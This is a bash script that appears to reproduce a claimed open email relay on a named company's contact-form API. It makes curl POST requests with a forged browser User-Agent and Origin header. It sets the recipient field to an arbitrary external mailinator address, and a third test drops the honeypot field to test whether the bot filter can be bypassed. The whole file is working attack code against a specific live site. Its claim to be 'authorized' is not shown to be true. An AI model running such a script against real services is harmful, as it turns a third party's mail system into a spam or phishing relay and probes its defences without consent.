#!/bin/bash
# Independent re-reproduction of the claimed open email relay on the contact API.
B="https://www.infinitycapital.bh/api/send"
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36'
STAMP="IVVERIFY-$(date -u +%Y%m%dT%H%M%SZ)"

send() {  # $1 = label, $2 = recipient (value of `targets`)
  echo "########## $1"
  echo "# targets=$2   stamp=$STAMP"
  curl -s -m 45 -D /tmp/h.txt -o /tmp/b.txt -X POST "$B" \
    -H "User-Agent: $UA" \
    -H "Origin: https://www.infinitycapital.bh" \
    -F 'fname=Iv' -F 'lname=Verifier' -F 'areacode=973' -F 'tel=5550001111' \
    -F 'cname=Independent Verifier' -F 'subject=Relay repro test' \
    -F "msg=Authorized security re-verification test $STAMP - please ignore." \
    -F 'check=0' -F "targets=$2"
  echo "--- status/headers:"; grep -iE '^(HTTP/|x-matched-path|x-vercel-mitigated|content-type|content-length)' /tmp/h.txt
  echo "--- body:"; cat /tmp/b.txt; echo; echo
}

echo "===== TEST 1: CONTROL - the site's own legitimate recipient ====="
send "CONTROL (legit own domain)" "info@infinitycapital.bh"
sleep 4
echo "===== TEST 2: arbitrary THIRD-PARTY external recipient ====="
send "EXTERNAL arbitrary recipient" "probe-iv7f2c@mailinator.com"
sleep 4
echo "===== TEST 3: honeypot `check` OMITTED entirely (bot-submission filter test) ====="
echo "########## CONTROL-honeypomt-omitted"
curl -s -m 45 -D /tmp/h3.txt -o /tmp/b3.txt -X POST "$B" -H "User-Agent: $UA" \
  -F 'fname=Iv' -F 'lname=Verifier' -F 'areacode=973' -F 'tel=5550001111' \
  -F 'cname=Independent Verifier' -F 'subject=Relay repro test' \
  -F "msg=Authorized security re-verification test $STAMP - please ignore." \
  -F "targets=probe-iv7f2c-nohp@mailinator.com"
grep -iE '^(HTTP/|x-matched-path|content-type)' /tmp/h3.txt; echo "--- body:"; cat /tmp/b3.txt; echo
echo "===== DONE $STAMP ====="
